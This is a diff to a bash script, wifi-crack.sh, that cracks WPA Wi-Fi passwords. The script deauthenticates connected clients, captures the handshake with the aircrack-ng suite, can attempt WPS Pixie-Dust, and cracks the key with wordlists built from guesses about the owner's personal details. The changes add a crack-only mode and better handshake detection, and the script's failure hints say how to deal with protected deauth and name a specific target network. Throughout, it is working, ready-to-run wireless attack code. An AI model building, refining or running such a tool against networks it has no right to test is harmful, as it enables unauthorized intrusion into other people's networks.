@@ -11,6 +11,7 @@
 #   sudo ./wifi-crack.sh -i wlan0 -s "MyWiFi"
 #   sudo ./wifi-crack.sh -i wlan0 -s "MyWiFi" -k "john home city 1990 1234"
 #   sudo ./wifi-crack.sh -i wlan0 -s "MyWiFi" -K ./clues.txt   # keywords from a file (combinable with -k)
+#   ./wifi-crack.sh -r wifi-crack-*/hs-01.cap -b AA:BB:CC:DD:EE:FF -k "john home 1990"   # crack an existing capture
 #   sudo ./wifi-crack.sh -i wlan0 -b AA:BB:CC:DD:EE:FF -c 7 -w /usr/share/wordlists/rockyou.txt
 #
 # Options:
@@ -19,23 +20,26 @@
 #   -c CHAN      force channel (else detected)
 #   -w FILE      existing wordlist file          -k "words" build a custom list from keywords (+numbers)
 #   -K FILE      build a custom list from keywords read from FILE (whitespace/newline-separated; adds to -k)
+#   -r FILE      crack-only: skip capture, crack an existing handshake .cap (pair with -k/-K/-w; -b optional)
 #   -t SEC       handshake capture timeout (default 180)    -d N  deauth burst size (default 4)
 #   --wps        also run a WPS Pixie-Dust attempt (optional)
 #   --no-crack   stop after capturing the handshake
 set -uo pipefail
 
-IFACE=""; SSID=""; BSSID=""; CHAN=""; WORDLIST=""; KEYWORDS=""; KEYFILE=""; CAP_TO=180; DEAUTH_N=4; DO_WPS=0; NO_CRACK=0
+IFACE=""; SSID=""; BSSID=""; CHAN=""; WORDLIST=""; KEYWORDS=""; KEYFILE=""; RESUMECAP=""; CAP_TO=180; DEAUTH_N=4; DO_WPS=0; NO_CRACK=0
 while [ $# -gt 0 ]; do case "$1" in
   -i) IFACE="$2"; shift 2;; -s) SSID="$2"; shift 2;; -b) BSSID="$2"; shift 2;;
-  -c) CHAN="$2"; shift 2;; -w) WORDLIST="$2"; shift 2;; -k) KEYWORDS="$2"; shift 2;; -K) KEYFILE="$2"; shift 2;;
+  -c) CHAN="$2"; shift 2;; -w) WORDLIST="$2"; shift 2;; -k) KEYWORDS="$2"; shift 2;; -K) KEYFILE="$2"; shift 2;; -r) RESUMECAP="$2"; shift 2;;
   -t) CAP_TO="$2"; shift 2;; -d) DEAUTH_N="$2"; shift 2;;
   --wps) DO_WPS=1; shift;; --no-crack) NO_CRACK=1; shift;;
   -h|--help) grep '^#' "$0" | sed 's/^# \?//'; exit 0;;
   *) echo "unknown arg: $1 (use -h)"; exit 2;; esac; done
 
-[ "$(id -u)" -eq 0 ] || { echo "run with sudo"; exit 1; }
-[ -n "$IFACE" ] || { echo "need -i <iface>"; exit 2; }
-[ -n "$SSID$BSSID" ] || { echo "need -s <ssid> or -b <bssid>"; exit 2; }
+if [ -z "$RESUMECAP" ]; then
+  [ "$(id -u)" -eq 0 ] || { echo "run with sudo"; exit 1; }
+  [ -n "$IFACE" ] || { echo "need -i <iface>"; exit 2; }
+  [ -n "$SSID$BSSID" ] || { echo "need -s <ssid> or -b <bssid>"; exit 2; }
+fi
 # trim stray leading/trailing whitespace from the SSID — otherwise it breaks the scan
 # match (looks for ,SSID,) and gets written into RESULT.txt/OUTDIR with the space attached
 SSID="${SSID#"${SSID%%[![:space:]]*}"}"; SSID="${SSID%"${SSID##*[![:space:]]}"}"
@@ -56,6 +60,7 @@ MON="$IFACE"; AIRO_PID=""; DRV=""; CLEANED=0
 
 # ---------- reset: always put the radio + networking back the way we found them ----------
 cleanup(){
+  [ -n "$RESUMECAP" ] && return 0   # crack-only mode never touched the radio
   [ "$CLEANED" = 1 ] && return 0; CLEANED=1
   # stop anything we started on the radio
   [ -n "${AIRO_PID:-}" ] && kill "$AIRO_PID" 2>/dev/null
@@ -88,6 +93,16 @@ cleanup(){
 trap cleanup EXIT
 trap 'cleanup; exit 130' INT TERM
 
+if [ -n "$RESUMECAP" ]; then
+  # ---------- crack-only: skip acquisition, use the capture handed in with -r ----------
+  step "Crack-only: using existing capture $RESUMECAP"
+  command -v aircrack-ng >/dev/null || { err "missing tool: aircrack-ng  (sudo apt install -y aircrack-ng)"; exit 1; }
+  [ -f "$RESUMECAP" ] || { err "capture not found: $RESUMECAP"; exit 2; }
+  cp "$RESUMECAP" "$OUTDIR/handshake.cap"
+  [ -z "$BSSID" ] && BSSID=$(aircrack-ng "$OUTDIR/handshake.cap" </dev/null 2>/dev/null | awk '$1 ~ /^[0-9]+$/ && tolower($0) ~ /handshake/{print $2; exit}')
+  [ -n "$BSSID" ] || { err "no handshake found in $RESUMECAP — pass -b <bssid> if you know it"; exit 3; }
+  ok "handshake loaded for $BSSID — jumping straight to the wordlist + crack"
+else
 step "Preflight"
 for t in airmon-ng airodump-ng aireplay-ng aircrack-ng iw; do
   command -v "$t" >/dev/null || { err "missing tool: $t  (sudo apt install -y aircrack-ng)"; exit 1; }
@@ -178,17 +193,21 @@ fi
 
 # ---------- capture handshake ----------
 step "Capturing WPA handshake (deauth + listen, up to ${CAP_TO}s)"
-cap="$OUTDIR/hs"; rm -f "$cap"-*.cap "$cap"-*.csv
-airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$cap" --output-format pcap,csv "$MON" >/dev/null 2>&1 &
+cap="$OUTDIR/hs"; DUMPLOG="$OUTDIR/airodump.log"; rm -f "$cap"-*.cap "$cap"-*.csv "$DUMPLOG"
+airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$cap" --output-format pcap,csv "$MON" > "$DUMPLOG" 2>&1 &
 AIRO_PID=$!; sleep 4
-have_hs(){ aircrack-ng "$cap"-01.cap 2>/dev/null | grep -qiE "$BSSID.*1 handshake|\(1 handshake\)"; }
+# detect two ways: airodump's own live "WPA handshake" notice (instant, so we stop the
+# moment it lands), then aircrack confirming a complete 4-way in the cap (authoritative
+# but slow on a big file). </dev/null keeps aircrack from blocking on a prompt.
+have_hs(){ grep -qi "WPA handshake" "$DUMPLOG" 2>/dev/null && return 0
+           aircrack-ng "$cap"-01.cap </dev/null 2>/dev/null | grep -qiE '\([1-9][0-9]* handshake'; }
 start=$(date +%s); rounds=0; quiet=0; CAPTURED=0; last_deauth=0; DEAUTH_EVERY=${DEAUTH_EVERY:-15}
 while :; do
   elapsed=$(( $(date +%s) - start ))
-  if have_hs; then
+  # prompt stop: airodump's own "WPA handshake" notice shows within a second or two of
+  # capture — far faster (and more reliable) than re-parsing the whole growing .cap each tick
+  if grep -qi "WPA handshake" "$DUMPLOG" 2>/dev/null; then
     CAPTURED=1; ok "handshake CAPTURED after ${elapsed}s"
-    # snapshot NOW, while airodump still holds a known-good file; the kill below can
-    # flush a truncated .cap, which is why the post-loop re-read used to see nothing
     cp "$cap"-01.cap "$OUTDIR/handshake.cap" 2>/dev/null
     break
   fi
@@ -215,7 +234,7 @@ while :; do
       if [ "$quiet" -ge 4 ]; then
         warn "radio looks quiet — resetting (rtw88-over-USB wedge)"; kill "$AIRO_PID" 2>/dev/null
         reset_radio; iw dev "$MON" set channel "$CHAN" 2>/dev/null
-        airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$cap" --output-format pcap,csv "$MON" >/dev/null 2>&1 &
+        airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$cap" --output-format pcap,csv "$MON" > "$DUMPLOG" 2>&1 &
         AIRO_PID=$!; quiet=0; sleep 4
       fi
     fi
@@ -224,8 +243,14 @@ while :; do
   info "... ${elapsed}s elapsed, listening (Ctrl-C to stop)"
   sleep 3
 done
-kill "$AIRO_PID" 2>/dev/null; AIRO_PID=""
-# decide on the in-loop result only — do NOT re-run have_hs against the live file we just killed
+kill "$AIRO_PID" 2>/dev/null; wait "$AIRO_PID" 2>/dev/null; AIRO_PID=""
+# airodump flushes and closes the .cap as it exits (we wait for that above), then an
+# authoritative final check on the complete file catches a handshake that landed too late —
+# or was still buffered — for the in-loop checks, instead of a false timeout.
+if [ "$CAPTURED" != 1 ] && have_hs; then
+  CAPTURED=1; ok "handshake CAPTURED (confirmed after stopping capture)"
+  cp "$cap"-01.cap "$OUTDIR/handshake.cap" 2>/dev/null
+fi
 if [ "$CAPTURED" != 1 ]; then
   err "no handshake captured — make sure a device is connected to the AP, then retry"
   # diagnose what actually landed in the capture so the failure is actionable
@@ -233,7 +258,10 @@ if [ "$CAPTURED" != 1 ]; then
   if [ -f "$diag" ]; then
     info "diagnostics ($diag):"
     aircrack-ng "$diag" </dev/null 2>/dev/null | awk '/BSSID/{p=1} p&&NF' | sed 's/^/      /'
-    if command -v tshark >/dev/null 2>&1; then
+    if aircrack-ng "$diag" </dev/null 2>/dev/null | grep -qiE '\([1-9][0-9]* handshake'; then
+      warn "a COMPLETE handshake IS in the capture — live detection missed it. Crack it directly with:"
+      warn "  ./wifi-crack.sh -r \"$diag\" -b $BSSID -k \"<your guesses>\""
+    elif command -v tshark >/dev/null 2>&1; then
       eapol=$(tshark -r "$diag" -Y eapol 2>/dev/null | wc -l | tr -d ' ')
       if [ "${eapol:-0}" -eq 0 ]; then
         warn "0 EAPOL frames captured — no 4-way handshake reached us on channel $CHAN. Likely:"
@@ -241,7 +269,7 @@ if [ "$CAPTURED" != 1 ]; then
         warn "  * 802.11w/PMF on the AP (protected deauth is ignored), or"
         warn "  * the device is on the 5 GHz 'Hema 4G' (different BSSID) — scan with:  airodump-ng --band a $MON"
       else
-        warn "$eapol EAPOL frame(s) captured but no COMPLETE handshake — only partial messages."
+        warn "$eapol EAPOL frame(s) but no complete handshake — only partial messages."
         warn "toggle one device's Wi-Fi off/on once during the capture window so it reassociates cleanly."
       fi
     else
@@ -252,6 +280,7 @@ if [ "$CAPTURED" != 1 ]; then
 fi
 [ -s "$OUTDIR/handshake.cap" ] || cp "$cap"-01.cap "$OUTDIR/handshake.cap" 2>/dev/null
 ok "handshake saved: $OUTDIR/handshake.cap"
+fi
 [ "$NO_CRACK" = 1 ] && { ok "stopping before crack (--no-crack)"; exit 0; }
 
 # ---------- wordlist ----------
